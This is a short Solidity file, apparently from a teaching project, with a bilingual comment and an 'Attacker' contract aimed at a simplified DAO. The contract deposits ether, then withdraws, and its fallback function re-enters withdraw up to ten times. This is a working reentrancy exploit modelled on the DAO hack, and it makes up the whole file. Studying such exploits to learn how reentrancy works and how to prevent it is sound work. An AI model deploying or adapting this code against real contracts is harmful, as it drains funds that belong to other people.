/*
  add very simplified The DAO contract (deposit, withdraw)
  add attacker contract
  增加非常简化的DAO合约（押金，提款）
  添加攻击者合约
*/
pragma solidity ^0.4.24;
import "./MiniDAO.sol";

contract Attacker {
    uint stack = 0;
    uint amount;
    MiniDAO dao;

    constructor(address daoAddress) payable public {
        dao = MiniDAO(daoAddress);
        amount = msg.value;
        dao.deposit.value(msg.value)();
    }

    function attack() public {
        dao.withdraw(amount);
    }

    function() public {
        if(stack++ < 10) {
            dao.withdraw(amount);
        }
    }
}
